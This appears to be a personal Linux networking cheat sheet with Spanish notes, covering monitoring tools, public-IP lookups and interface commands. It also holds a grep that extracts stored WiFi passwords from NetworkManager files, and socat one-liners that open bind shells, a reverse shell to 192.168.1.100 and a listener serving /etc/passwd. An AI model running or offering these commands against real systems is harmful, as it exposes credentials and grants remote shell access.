# Networking


ip2route suite


Monitoring

    iftop

    tcpdump

    netstat -tuln

    ss -tuln

    dmesg | grep -i net

    nload

    bmon

Ver dirección IP Pública

    curl ifconfig.me
    curl -4 -s https://ifconfig.me
    curl -s https://api.ipify.org
    curl -s https://checkip.amazonaws.com


    ip addr
    ip a
    hostname -I ; -i
    ip -s -s neigh flush all  (limpiar ARP cache)



    ls -lha /etc/NetworkManager/system-connections/*
    grep -i 'psk' /etc/NetworkManager/system-connections/* (Obtener WIFI passwords)
    
    nmcli connection show

    

## tcpdump


    tcpdump -i eth0 -nn -e

    


## Connections

    REVERSE_IP=$(hostname -I | tr -d " ")

    socat TCP-LISTEN:4444 EXEC:/bin/bash
    socat TCP-LISTEN:5555 SYSTEM:"id"
    socat TCP-CONNECT:192.168.1.100:4444 EXEC:/bin/sh
    socat TCP-LISTEN:6666 EXEC:"cat /etc/passwd"


    ss


